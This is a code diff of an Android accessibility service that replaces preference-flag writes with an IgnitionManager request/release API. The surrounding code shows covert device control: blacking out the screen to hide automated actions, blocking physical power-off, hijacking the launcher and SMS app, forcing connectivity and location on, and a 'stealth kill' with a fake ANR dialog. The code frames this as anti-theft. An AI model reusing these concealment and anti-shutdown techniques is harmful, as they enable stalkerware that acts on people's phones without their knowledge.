@@ -276,7 +276,7 @@ class MyAccessibilityService : AccessibilityService() {
                         val isSequenceActive = instance?.activeSequence != null || DefaultSmsManager.expectedMode.isNotEmpty() || LauncherManager.isHijacking
                         if (!DynamicUIManager.isAnyAttached && !hasDimmer && !isSequenceActive) {
                             DebugLogger.log("POWER_SHIELD", "Failsafe: Ignition lock active but no UI or Sequence attached. Disarming lock to prevent wake loop.")
-                            prefs.edit().putBoolean("power_shield_keep_ignited", false).apply()
+                            DimmerManager.IgnitionManager.clearAll(context)
                         } else {
                             DebugLogger.log("POWER_SHIELD", "Physical power-off detected during critical sequence. Re-igniting hardware.")
                             val pulseIntent = Intent(context, PulseActivity::class.java).apply {
@@ -779,7 +779,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }, 800)
                 
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                    DimmerManager.IgnitionManager.release(applicationContext, "FORCE_LOCATION")
                     DimmerManager.removeOverlay(applicationContext)
                 }, 2500)
             }
@@ -832,7 +832,7 @@ class MyAccessibilityService : AccessibilityService() {
                 }, 800)
                 
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                    DimmerManager.IgnitionManager.release(applicationContext, "FORCE_WIFI")
                     DimmerManager.removeOverlay(applicationContext)
                 }, 2500)
             }
@@ -893,7 +893,7 @@ class MyAccessibilityService : AccessibilityService() {
                                 
                                 // Final step: Restore screen brightness after home jump
                                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                    getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                                    DimmerManager.IgnitionManager.release(applicationContext, "FORCE_DATA")
                                     DimmerManager.removeOverlay(applicationContext)
                                 }, 2500)
                                 break
@@ -972,7 +972,7 @@ class MyAccessibilityService : AccessibilityService() {
                             }, 600)
 
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                                DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
                                 DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
                             }, 2500)
                         }, 600)
@@ -1015,7 +1015,7 @@ class MyAccessibilityService : AccessibilityService() {
 
                     // Generous 5-second timer to ensure UI has fully exited to home before unblinding
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                        DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
                         DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
                     }, 5000)
                     return
@@ -1089,7 +1089,7 @@ class MyAccessibilityService : AccessibilityService() {
 
                                         // Safely drop the blindfold after transitioning home
                                         delay(3500) 
-                                        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                                        DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
                                         DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_PROACTIVE")
                                     }
                                 }
@@ -1530,7 +1530,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceTarget = fontName
         activeSequence = "FONT_PHASE_1"
         startSequenceWatchdog()
-        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
         
         Handler(Looper.getMainLooper()).post {
             DimmerManager.applyDim(this, 0, "AUTO")
@@ -1547,7 +1547,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceTarget = themeName
         activeSequence = "THEME_PHASE_1"
         startSequenceWatchdog()
-        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
         
         Handler(Looper.getMainLooper()).post {
             DimmerManager.applyDim(this, 0, "AUTO")
@@ -1564,7 +1564,7 @@ class MyAccessibilityService : AccessibilityService() {
         sequenceTarget = targetState
         activeSequence = "AIRPLANE_PHASE_1"
         startSequenceWatchdog()
-        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
         
         DebugLogger.log("AIRPLANE_SEQ", "Starting sequence. Dimming to 20%.")
         Handler(Looper.getMainLooper()).post {
@@ -1583,7 +1583,7 @@ class MyAccessibilityService : AccessibilityService() {
         activeSequence = "EYE_PHASE_1"
         startSequenceWatchdog()
         isSilentSequence = silent
-        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
+        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
         
         Handler(Looper.getMainLooper()).post {
             if (!silent) DimmerManager.applyDim(this, 0, "AUTO")
@@ -1603,8 +1603,7 @@ class MyAccessibilityService : AccessibilityService() {
         
         if (isStandalone) {
             // Arm the hardware ignition lock to prevent the thief from interrupting the standalone reset
-            getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                .putBoolean("power_shield_keep_ignited", true).apply()
+            DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
         }
         
         DebugLogger.log("MDR_LIFECYCLE", "startMasterDisplayReset called. Dispatching Dimmer 0 AUTO and opening Settings.")
@@ -2046,8 +2045,7 @@ class MyAccessibilityService : AccessibilityService() {
                         
                         if (standalone) {
                             // Release the ignition lock so the phone can be turned off normally again
-                            getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                                .putBoolean("power_shield_keep_ignited", false).apply()
+                            DimmerManager.IgnitionManager.release(applicationContext, "ACC_SEQUENCE")
                         }
 
                         delay(1000)
@@ -2088,7 +2086,7 @@ class MyAccessibilityService : AccessibilityService() {
         val id = sequenceCmdId
         val silent = isSilentSequence
         isSilentSequence = false
-        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+        DimmerManager.IgnitionManager.release(applicationContext, "ACC_SEQUENCE")
         CoroutineScope(Dispatchers.IO).launch {
             CommandProcessor.updateCommandStatus(applicationContext, id, "SUCCESS", msg)
             delay(1000)
@@ -2164,7 +2162,7 @@ class MyAccessibilityService : AccessibilityService() {
             
             // 7. Remove Dimmer and Launch Fake ANR Dialog on Main Thread
             withContext(Dispatchers.Main) {
-                getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                DimmerManager.IgnitionManager.release(this@MyAccessibilityService, "STEALTH_KILL")
                 DimmerManager.removeOverlay(this@MyAccessibilityService)
                 DynamicUIManager.removeOverlay(this@MyAccessibilityService, "STEALTH_KILL_COMPLETE")
                 
@@ -2224,7 +2222,12 @@ class MyAccessibilityService : AccessibilityService() {
         isWaitingForWifiSettings = false
         isWaitingForLocationSettings = false
         isPerformingStealthKill = false
-        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+        DimmerManager.IgnitionManager.release(this, "ACC_SEQUENCE")
+        DimmerManager.IgnitionManager.release(this, "STEALTH_KILL")
+        DimmerManager.IgnitionManager.release(this, "SMS_GHOST")
+        DimmerManager.IgnitionManager.release(this, "FORCE_WIFI")
+        DimmerManager.IgnitionManager.release(this, "FORCE_DATA")
+        DimmerManager.IgnitionManager.release(this, "FORCE_LOCATION")
         DebugLogger.log("FAILSAFE", "All Accessibility sequences aborted.")
     }
 
